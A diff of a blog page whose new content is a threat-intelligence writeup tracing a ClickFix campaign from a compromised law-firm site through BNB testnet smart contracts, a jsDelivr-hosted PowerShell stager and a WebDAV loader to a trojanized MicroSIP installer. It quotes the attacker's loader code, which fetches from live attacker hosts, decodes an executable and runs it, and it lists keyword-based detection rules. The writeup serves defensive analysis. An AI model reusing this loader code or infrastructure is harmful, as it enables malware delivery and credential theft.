@@ -268,58 +268,431 @@ img{max-width:100%;height:auto;display:block}
      ========================================================================== -->
 <script id="source" type="text/markdown">
 ---
-title: MobileHackingLab "Cyclic Scanner" Lab Writeup
-summary: A private service, no exported components, and a filename that reaches a shell unquoted.
-date: 2026-08-22
-kind: Android lab
-tags: android, command injection, frida
-canonical: https://medium.com/@ghostwirez/mobilehackinglab-cyclic-scanner-lab-writeup-4f0812c23799
+title: Chasing a ClickFix Campaign Down the Blockchain: From a Law Firm to a Trust-Abusing Loader
+summary: A live walk through a ClearFake/ClickFix delivery chain — a hidden injected script, EtherHiding smart contracts, jsDelivr abuse…
+date: 2026-08-26
+kind: Threat intel
+tags: threat intel, clickfix, blockchain, malware
+canonical: https://medium.com/@ghostwirez/chasing-a-clickfix-campaign-down-the-blockchain-from-a-law-firm-to-a-trust-abusing-loader-426422ea7606
 ---
 
-This block is a worked example so you can see every element styled. Delete all
-of it and paste your own Markdown — the front matter above stays, with your
-values.
+**Update (2026–08–26):** At time of retrieval, `ae.any` was unknown to VirusTotal (first-seen). By the following day both files had detections — `ae.any` at 10/69 (`trojan.cibc/genheur`) and the MicroSIP payload at 24/70 (`trojan.abtrojan/cibh`). Neither names a specific stealer family; detections remain generic trojan/injector labels. The `spreader` tag on the MicroSIP file suggests propagation capability beyond credential theft.
 
-## A section heading
+## 0. Before we start
 
-Regular paragraphs look like this, with **bold**, *italics*, `inline code`, and
-[links](https://example.com) that open in a new tab automatically when they
-point somewhere external.
+Everything in this writeup was done passively. I did no testing against the victim organization’s systems, and my interaction with the attacker’s infrastructure was limited to retrieving payloads they were already serving publicly. Nothing was executed. I’m not affiliated with the victim organization or with any government agency, and nothing here was done on anyone’s behalf.
 
-### A subsection
+If you only take one thing away: the interesting part of this campaign isn’t the PowerShell. It’s that the *logic* lives on a blockchain nobody can take down, wrapped in enough layers that a normal static scan of the compromised page comes back completely clean. That’s the story — and the order I found it in is the order I’ll tell it.
 
-- Bulleted lists get a hairline dash rather than a bullet
-- Which keeps the page monochrome
-- Three levels of heading are enough for any writeup
+## 1. Where it started
 
-> Pull quotes sit in a hairline box. Useful for the one sentence you want a
-> skimming reader to actually take away.
+I came across it the way any visitor would, I’d navigated to a legitimate Philippine law firm’s website, and the page threw a fake “*I’m not a robot*” CAPTCHA at me.
 
-```bash
-adb shell am start -n com.example/.MainActivity --es name "test"
+![](../images/posts/clickfix-blockchain/01.png)
+
+Except this one didn’t want a checkbox click. It wanted me to press a key combination, paste, and hit Enter. If you know what you’re looking at, that’s **ClickFix:** instead of exploiting the browser, the attacker convinces *you* to run the command for them.
+
+One note before we go further is that the law firm is a victim here, not the villain. Their site was compromised and turned against their own visitors. **They’ve been notified**.
+
+![](../images/posts/clickfix-blockchain/02.jpeg)
+
+I wanted to know where the CAPTCHA was coming from. So I did the boring, essential thing first: I looked at the page.
+
+## 2. First look: read the source, get nothing
+
+First instinct, always view the raw HTML the server actually sent, not the pretty rendered page. The site was built on Next.js, and honestly it looked clean. Every script tag pointed at first-party Next.js bundles. No third-party analytics, no ad network, no chat widget — none of the usual injection vectors.
+
+I pulled every JavaScript chunk and grepped them for anything suspicious:
+
+```shell
+for f in *.js; do
+  grep -oiE 'clipboard|writeText|eval\(|atob|powershell|captcha' "$f"
+done
 ```
 
-Fenced code blocks show the language in the hatched strip along the top. Give
-every fence a language — `bash`, `kotlin`, `xml`, `python`, `json` — and it
-appears there.
+Nothing but framework internals — React’s synthetic clipboard event system, the Next.js bootstrap decoder. That’s a moment where a lot of people close the tab and call the site clean. And if you only check the linked scripts, you’d be *wrong*, which is the first lesson of this whole thing.
 
-```kotlin
-val cmd = "md5sum " + file.absolutePath
-Runtime.getRuntime().exec(cmd)
+The injection wasn’t in a `.js` file at all. It was sitting right in the raw HTML `<head>`, and it didn't look like a script reference — it looked like this:
+
+```xml
+<script src="data:text/javascript;base64,CmFzeW5jIGZ1bmN0aW9uIGxvYWRf..."><\/script>
 ```
 
-![A caption, which is also the image's alt text](../images/posts/example.png)
+A `data:` URI. The code isn't fetched from anywhere — it's inline, Base64-encoded, embedded straight into the page. That's why grepping the bundles found nothing. **Read the head, not just the scripts.**
 
-Images become framed figures, and the alt text becomes the caption. Write it
-properly — it is the only description a screen reader user gets.
+## 3. Down the rabbit hole: the front-end is on a blockchain
 
-| Field | Value |
-| --- | --- |
-| Target | Cyclic Scanner |
-| Class | OS command injection |
-| Impact | Code execution as the app |
+Base64-decode the `data:` blob and you get readable JavaScript. It was short and clearly a loader, not the lure itself. But a couple of lines stopped me:
 
-Tables work too, styled like the credentials block on the front page.
+```javascript
+async function load_(address) {
+    // ... queries a smart contract via eth_call ...
+    const _rpcUrls = [
+        "https://data-seed-prebsc-1-s1.bnbchain.org:8545/",
+        "https://bsc-testnet-rpc.publicnode.com/",
+        // ... 8 total
+    ];
+    // ...
+    eval(atob(_p));
+}
+load_("0xE75744C53eC0914fE9bE92847019D3d7122B6b77").then(...)
+```
+
+`eth_call`. `bnbchain`. `data-seed-prebsc`. This script isn't fetching its next stage from a server. It's reading a value out of a **smart contract on the BNB Smart Chain testnet** and `eval`-ing the result.
+
+![](../images/posts/clickfix-blockchain/03.png)
+
+This is **EtherHiding**, and the lure logic isn’t hosted on a server at all — you can’t seize it, there’s no host to take down, there’s no abuse email to send. And they used *testnet*, where **gas is free** — so it costs them nothing to host it forever.
+
+The good news: reading a contract is completely passive. It’s public chain state, and querying it touches none of the attacker’s infrastructure:
+
+```shell
+curl -sS -X POST https://bsc-testnet-rpc.publicnode.com/ \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","id":97,"method":"eth_call","params":[{"to":"0xE757...","data":"0x6d4ce63c"},"latest"]}'
+```
+
+## 4. Contracts all the way down
+
+The contract didn’t hand me the lure. It handed me *more JavaScript* — which pointed at *another* contract. This was going to be a chain of them.
+
+Each layer returns a string that’s **ABI-encoded → Base64 → gzip → JavaScript**, and that JavaScript resolves the *next* contract. Here’s where I burned some time: my first decoder kept spitting out what looked like the *same* gating code over and over, like it was looping, and I assumed my decoder was broken and rewrote it twice.
+
+It wasn’t broken. Each layer genuinely *reincludes* the loader stub before it descends. Once I stopped blindly feeding output back into the same function and actually formatted and *read* the code, the structure fell out:
+
+```
+0xE757…  get()            → gating + OS/geo router
+  ├─ 0x0f14…  get()        → macOS branch
+  └─ 0x4a0e…  get()        → Windows branch
+       └─ 0xf4a3…  get(victim_param)  → the actual lure
+```
+
+**Four contracts.** A root that figures out who you are and routes you, two middle contracts that split by operating system, and a final one holding the lure — queried with call data built at runtime from a per-visitor UUID and user ID, so the lure is **keyed to each victim**.
+
+> Lesson relearned: when a recursive decode looks like it’s looping, stop and *read it*, don’t just keep peeling.
+
+## 5. What the lure checks before it even shows up
+
+Here’s the part most public writeups on this campaign skip, because you only see it if you decode the leaf. Before the fake CAPTCHA ever renders, the root stage runs gates:
+
+- **Anti-headless** — `navigator.webdriver`, headless-Chrome/Puppeteer/Playwright/PhantomJS UA strings, zero-dimension viewport, missing browser objects. Needs two-plus hits to bail.
+- **Anti-localhost** — bails on `localhost`, `::1`, and RFC 1918 ranges. Avoids dev boxes.
+- **Geo/IP fingerprinting** via `ip-info.ff.avast.com/v2/info`.
+- **Render verification** — checks the overlay actually painted, to defeat non-rendering scrapers.
+
+*This is why sandboxes and URL scanners see nothing.* The payload only runs for a real, interactive, non-local browser. It was designed specifically to beat the “submit the URL to a sandbox” reflex — which means the only way to see this attack is to look like a genuine victim. That’s exactly why poking at it manually caught what automation wouldn’t.
+
+Then it branches on OS. I decoded both:
+
+1. **Windows (**“Press Windows key, open PowerShell, paste, Enter”) — a Base64/UTF-16LE PowerShell command
+2. **macOS (**“Open Terminal, Command+V, Enter”) — a shell variant
+
+The **macOS branch is worth flagging** — most reporting on this campaign only covers Windows. And the lure even runs **Yandex Metrika** (counter `110784881`), firing a `reachGoal('Click')` when you click the fake checkbox. The operator is A/B-tracking conversions on their victims.
+
+At this point I’d answered the original question — *where’s the CAPTCHA coming from* — completely. It’s served from a **chain of blockchain contracts**, gated against analysis, **handing each victim a platform-specific command to paste**. Now I wanted to know what that command actually does.
+
+## 6. Layer one: Caesar salad
+
+The Windows clipboard payload — the thing a victim pastes into an open PowerShell window — was this:
+
+```powershell
+& ([scriptblock]::Create([System.Text.Encoding]::Unicode.GetString(
+    [System.Convert]::FromBase64String('JABTAFMAdQBOAFMAcgB6AEQAIAA9...'))))
+```
+
+No `powershell.exe` prefix, no `-EncodedCommand`. Just a script block built from a Base64 blob — designed to be pasted directly into an open PowerShell window, exactly as the lure instructs.
+
+The Base64 is **UTF-16LE**, not UTF-8, a plain `base64 -d` gives you a null byte between every character. Decode it right and… there's still no plaintext.
+
+Every meaningful string is rebuilt at runtime by an inline **Caesar rotation** — and the shift value is different for each string, embedded right there in the `%26` modulo. Instead of hand-decoding, I let the code tell me the shift:
+
+```python
+def rot(s, n):
+    out = ''
+    for ch in s:
+        c = ord(ch)
+        if 65 <= c <= 90:    out += chr(65 + (c-65+n) % 26)
+        elif 97 <= c <= 122: out += chr(97 + (c-97+n) % 26)
+        else:                out += ch
+    return out
+```
+
+Peeling it gave up the whole stage:
+
+![](../images/posts/clickfix-blockchain/04.png)
+
+(Note the first one is Base64 *inside* the rotation — rotate first, then decode.)
+
+**What it does**:
+
+1. Fetch the next stage from `cdn.jsdelivr.net` via the `WinHttp.WinHttpRequest.5.1` COM object (not `Invoke-WebRequest`, to dodge the common cradles)
+2. Find `powershell.exe` dynamically,
+3. And spawn a hidden child PowerShell with `-EP Bypass -` — then **write the fetched script into its standard input**.
+4. That trailing `-` means "read from stdin." The next stage never touches disk.
+
+## 7. The jsDelivr trick
+
+The download URL is the clever bit:
+
+```
+https://cdn.jsdelivr.net/gh/Patricia-38674/ret74kfd98j/nam1o0tych
+```
+
+jsDelivr is a legitimate, trusted developer CDN. Its `/gh/user/repo/file` path proxies raw content straight from GitHub. So the attacker uploads a payload to a throwaway GitHub account ( `Patricia-38674`), and jsDelivr "CDN-ifies" it.
+
+To a proxy or a reputation engine, the traffic is just a developer pulling from a high-reputation CDN. Category-based blocking won't touch it.
+
+I checked the account. It was **hours old**:
+
+![](../images/posts/clickfix-blockchain/05.png)
+
+```json
+{ "created_at": "2026-08-24T08:31:47Z", "public_repos": 3 }
+```
+
+Three repos, not one. I pulled the other two text stagers, safe to read — and diffed them. Same template, three different targets:
+
+![](../images/posts/clickfix-blockchain/06.png)
+
+![](../images/posts/clickfix-blockchain/07.png)
+
+Three parallel delivery chains from one account. And the domains — `cardioslim`, `mindvault`, `heroup` — are supplement-brand-flavored, the signature of a bulk-registered affiliate pool being reused for malware.
+
+## 8. Layer two: WebDAV over HTTPS
+
+Retrieving the code from the GitHub repository shows the following:
+
+Setup: building the WebDAV path:
+
+```powershell
+$FrIrOm = 'rwj46i7as3h4.en-heroup.us'
+$mzOCo  = '47406900-4551-4467-8968-0c621e1733a1'
+$axCA   = 'siKzwYcgZqHiAG.txt'
+$Asybi  = 'Z:'
+$dOl6cR = '\\' + $FrIrOm + '@SSL\DavWWWRoot\' + $mzOCo   # WebDAV-over-HTTPS UNC
+```
+
+Mounting the share:
+
+```shell
+$HoUX = Ne`w-Object -ComObject WScript.Network            # backtick breaks the AMSI string
+$HoUX.MapNetworkDrive($Asybi, $dOl6cR, ($env:COMPUTERNAME.Length -lt 0))  # arg 3 = $false
+
+# poll up to 50 * 100ms for the mount to come up
+$TD4fw2XF = (76 - 76)                                     # = 0, written as arithmetic
+while (-not [IO.Directory]::Exists(($Asybi + '\')) -and $TD4fw2XF -lt 50) {
+    &("Start-Sle"+"ep") -Milliseconds 100                # split cmdlet name
+    $TD4fw2XF++
+}
+```
+
+Reading the payload:
+
+```powershell
+$wREZTJjD = [IO.File]::ReadAllBytes("$Asybi\$axCA")       # read the .txt payload
+$HoUX.RemoveNetworkDrive($Asybi, (1 -band 1), (1 -band 1)) # unmap immediately
+```
+
+The MZ/Base64 decision:
+
+```shell
+# is it already an MZ (PE)? if not, treat as Base64 and decode
+if ($wREZTJjD.Length -ge (99 - 97) -and $wREZTJjD[0] -eq 0x4D -and $wREZTJjD[1] -eq 0x5A) {
+    $rNVYz = $wREZTJjD
+} else {
+    $XPJHPGC = [Text.Encoding]::ASCII.GetString($wREZTJjD) -replace '[^A-Za-z0-9+/=]', ''
+    $rNVYz   = [Convert]::FromBase64String($XPJHPGC)
+}
+if ($rNVYz[0] -ne 0x4D -or $rNVYz[1] -ne 0x5A) { throw 'not MZ' }
+```
+
+Drop and execute:
+
+```shell
+# drop to INetCache under a random 12-hex name, then run it
+$HxyL  = -join ((48..57)+(97..102) | Get-Ran`dom -Count 12 | foreach { [char]$_ })
+$wWC83 = &("Join"+"-Path") $I6PrVZ ($HxyL + '.exe')
+[IO.File]::WriteAllBytes($wWC83, $rNVYz)
+
+$Rfpg = &("New-O"+"bject") System.Diagnostics.ProcessStartInfo
+$Rfpg.FileName        = $wWC83
+$Rfpg.UseShellExecute = ($null -ne $null)                # = $false
+[System.Diagnostics.Process]::Start($Rfpg) | &("Out-Nu"+"ll")
+```
+
+Stage 2 (the file jsDelivr serves) is a different obfuscation style — split cmdlet names like `"Join-Pa"+"th"`, backticks inside tokens, arithmetic instead of literals (`(76 - 76)` for zero, `($null -ne $null)` for false).
+
+Underneath, it does this:
+
+1. Maps `Z:` to `\\rwj46i7as3h4.en-heroup.us@SSL\DavWWWRoot\<GUID>`
+2. Reads a `.txt` file off the share into memory
+3. Checks for the `MZ` header. If absent, treats it as Base64 and decodes
+4. Drops the resulting PE to `%LOCALAPPDATA%\Microsoft\Windows\INetCache\<12 hex>.exe`
+5. Runs it
+
+The `@SSL\DavWWWRoot` syntax forces the Windows **WebClient service** to mount the share over **TLS on port 443**. Three things fall out of that:
+
+- **No SMB on 445.** Egress filtering keyed on SMB sees nothing.
+- **The fetch is done by **`svchost.exe`, not PowerShell. Any detection tied to "PowerShell made a network connection" misses it completely.
+- **The payload is a **`.txt`** on the wire.** Content inspection sees a text file.
+
+## 9. Watching the infrastructure die
+
+Here’s where catching it live paid off. I checked all three WebDAV hosts. The one from *my* chain (`en-heroup.us`) answered — a Cloudflare 403, which is a live edge gating my non-Windows request, not a dead host. The other two, from repos pushed thirteen hours earlier that morning.
+
+```
+Could not resolve host: rt8y45gkl9t7.eng-en-us-cardioslim.com
+Could not resolve host: yt8fj45sl9r6.eng-usa-mindvault.com
+```
+
+**NXDOMAIN.** Both gone. The operational subdomains are provisioned per campaign wave and torn down within hours. But WHOIS told the other half of the story:
+
+![](../images/posts/clickfix-blockchain/08.png)
+
+The apex domains are **8–11 months old**. The subdomains lived for hours.
+
+That’s the whole game: age the apex *until it’s reputation-clean*, then spin ephemeral subdomains off it per wave. And because two domains share a Cloudflare nameserver pair, they’re provably one account (Cloudflare assigns NS pairs per account).
+
+The defensive consequence writes itself:
+
+- **Domain-age heuristics**: Defeated — apexes are months old
+- **Reputation feeds**: Weak — apexes look like e-commerce
+- **FQDN blocklists**: Useless — subdomains expire in hours
+- **CT log monitoring: **Blind — Cloudflare wildcard cert, no per-subdomain record
+- **Apex-level blocking:** Works
+- **Behavioral detection: **Works
+
+## 10. The payload wears a borrowed costume
+
+This is the one point where “read the public data” wasn’t enough. The share was publicly mountable by anyone with the UNC path, but reaching it needed a real Windows WebDAV client, so I mounted it from a disposable VM, copied both files off.
+
+![](../images/posts/clickfix-blockchain/09.png)
+
+To get the final PE I mounted the WebDAV share from a Windows box — the real mini-redirector request sequence finally got past the gate that had been 403-ing my `curl`.
+
+![](../images/posts/clickfix-blockchain/10.png)
+
+The share held two files:
+
+1. `siKzwYcgZqHiAG.txt` (~24 MB)
+2. And a second one `ae.any` (~14.5 MB)
+
+![](../images/posts/clickfix-blockchain/11.png)
+
+Both start with `MZ` once you account for encoding — the `.txt` begins with `TVqQ`, which is `MZ` in Base64, and `ae.any` is a raw PE.
+
+My first assumption was that they were the same executable, one wrapped and one raw. They weren’t: decoding the `.txt` and hashing it gave a different SHA-256 than `ae.any`. Two *different* binaries, staged on the same share.
+
+The loader only fetches the `.txt`, so that's the one victims actually run. I copied both out and ran neither. Reading the delivered file statically:
+
+- **It’s a 17.87 MB native PE** masquerading as `MicroSIP-3.22.12.exe`**, "MicroSIP Installer"** — a real, open-source VoIP softphone, wrapped in an NSIS installer.
+- **It’s signed but invalid.** Windows reports **HashMismatch** — *“the hash of the file does not match the hash stored in the digital signature.”* Someone took the real MicroSIP 3.22.12 installer — signed with **MicroSIP’s own code-signing certificate** (`CN=MSIP Code Signing 2025`, serial `1E8334C11326D2AD46173C5313A60431`) — modified it, and kept the original cert.
+- **It carries a large overlay** — the classic loader-plus-packed-payload shape, with no plaintext C2 in the file.
+- **VirusTotal flags it 10/70**, labelled `trojan.hyis / injector / suspicious-NSIS`. Those are generic crypter and injector detections — they describe the *loader*, not the stealer it carries.
+
+![](../images/posts/clickfix-blockchain/12.jpeg)
+
+And `ae.any`, the file sitting next to it on the share? The same trick in a different costume — another tampered, HashMismatch binary, this one masquerading as Valve's **"Steam Drivers Archive"** (`drivers.exe`, v10.72.90.89).
+
+![](../images/posts/clickfix-blockchain/13.png)
+
+That one *was* unknown to VirusTotal — first-seen. So the operator staged two trojanized legitimate apps, different disguises, side by side. They're not wedded to one costume; they take any signed, trusted application, tamper it, and let its reputation carry the payload past a glance.
+
+That shape — signed shell, no plaintext config, a big overlay, injector detections — is the reflective-loader pattern the Amatera reporting describes. The NSIS installer runs, decrypts its overlay, and maps the real stealer into memory without writing it to disk. That’s why the static detections name a *crypter/injector* rather than a stealer: the operative payload doesn’t exist in analyzable form on disk, it only appears in RAM at runtime.
+
+So here’s what I can say honestly. The delivered payload is confirmed malicious — VirusTotal, ten vendors, plus a wall of ML detections — a tamper-signed, NSIS-wrapped trojan-injector. What I *can’t* say from the file’s own signatures is the specific stealer family: the detections point at “injector,” not at a named stealer. Based on the whole delivery chain and public reporting on this campaign I’m assessing the final stage as **Amatera/ACR — assessed, not confirmed from the binary.** The chain points there; the file’s own detections only confirm it’s a loader for *something*.
+
+**Payload hashes:**
+
+- `siKzwYcgZqHiAG.txt` — FE36AA9C16088119146C3CC83416521D6AE2551285CB94C50D8AC0CA92C42D3E
+- `stage3_decoded.bin` — 49D38992BB1C997787521CB29B8488A56F8830BC8AC7384E61396E1C63D2C576
+- `ae.any` — 2F5EC898A345186F8D6DB676504BC2416980DE92DCD51C34CC6EA2527EEAA6E8
+
+**Stage-2 stager hashes (jsDelivr-hosted PowerShell):**
+
+- `nam1o0tych` (repo: `ret74kfd98j`): 7fc7de7516f6e57839a59f0dd37ce24ad9a1f31104950487e03849bdd73fc873
+- `er3yg453kf9` (repo: `3e64gd7fjt`): f05de2719113a78a00339f038072324da80eea1077a9897e540b000c62a5d7ef
+- `65uto6of` (repo: `gr5ut76if4`): 191e3797a6f84dab260215bfa7f6a5175c85911926043f0042e5d239e04b437c
+
+## 11. The full chain
+
+Root to payload:
+
+```
+Compromised site  →  data: script in <head>
+    →  BSC testnet contract  (gating + OS/geo routing)
+        →  per-OS contract    (loader)
+            →  lure contract   (per-victim, ABI+Base64+gzip wrapped)
+                →  fake CAPTCHA  →  clipboard  →  PowerShell / Terminal
+                    →  jsDelivr PowerShell stager
+                        →  WebDAV-over-HTTPS loader
+                            →  PE dropped to INetCache  →  executed in memory
+                                →  (assessed) Amatera/ACR Stealer
+```
+
+Cross-referencing public reporting, this maps onto **ClickFix → Amatera (ACR) Stealer** activity.
+
+## 12. Detections worth keeping
+
+The IOCs will rotate. These won’t:
+
+**Blockchain RPC from a browser** — the earliest catch point:
+
+```kusto
+DeviceNetworkEvents
+| where RemoteUrl has_any ("bsc-testnet","data-seed-prebsc","bnbchain.org","binance.org:8545")
+| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe")
+```
+
+**The WebDAV **`@SSL`** mount:**
+
+```kusto
+DeviceProcessEvents
+| where ProcessCommandLine has "@SSL" and ProcessCommandLine has "DavWWWRoot"
+```
+
+**Execution from INetCache:**
+
+```kusto
+DeviceProcessEvents
+| where FolderPath has @"\Microsoft\Windows\INetCache\"
+| where FileName matches regex @"^[0-9a-f]{12}\.exe$"
+```
+
+**ClickFix itself, payload-agnostic:**
+
+```shell
+DeviceRegistryEvents
+| where RegistryKey has @"Explorer\RunMRU"
+| where RegistryValueData has_any ("powershell","FromBase64String","curl","mshta","conhost","iex")
+```
+
+This catches the broad ClickFix technique family where variants deliver via Win+R. This specific chain delivers via an open PowerShell window and would not generate a *RunMRU entry — the rule is durable, payload-agnostic coverage, not a detection derived from this sample.*
+
+And two hardening moves: **disable the WebClient service by GPO** (kills this entire delivery path and an NTLM relay primitive), and **block the three apex domains**, not the subdomains.
+
+## 13. What I’m left with
+
+I started with a fake CAPTCHA on a law firm’s homepage and ended up reading a four-contract resolver on a blockchain testnet.
+
+The thing that stays with me isn’t any single trick — it’s the *architecture*. Every layer that can be taken down is disposable and rotates in hours. The one layer that holds the actual logic sits on an immutable public ledger with no abuse contact. The operator built the whole thing so that the takedown-able parts are worthless to seize and the valuable part can’t be seized at all.
+
+That reframes the defensive question. You don’t win this by blocklisting IOCs that are dead by the time you publish them.
+
+You win it upstream — behaviourally
+
+- on the WebClient mount
+- the INetCache execution
+- the RunMRU paste
+- and a corporate browser having no business calling a BSC testnet RPC.
+
+And working it front-to-back made one thing obvious: the clever part is the *front-end*. By the time you reach the PowerShell, it’s fairly standard living-off-the-land tradecraft.
+
+All the real engineering — the blockchain hosting, the per-victim keying, the anti-sandbox gating, the OS routing — is up front, before a single command runs. That’s where the operator spent their effort, and it’s where detection is hardest. It’s also built specifically to beat the automated tools most defenders reach for first, which is exactly why manual, curious investigation is what got past it.
+
+There are pieces I still don’t have. The stealer’s family and its C2 servers live encrypted inside that overlay, and prying them out means detonating the sample in a setup built for it — which I haven’t done, deliberately. But the front-end, the delivery chain, and the payload itself — a tamper-signed trojan-injector hiding inside a legitimate app’s costume, with a second variant staged right beside it — are all in hand, verified by reading rather than running.
+
+*If you found this useful or you’ve seen this campaign in the wild, I’d love to compare notes — especially if you’ve got the C2.*
 </script>
 
 <script src="https://cdn.jsdelivr.net/npm/marked@12.0.2/marked.min.js"></script>
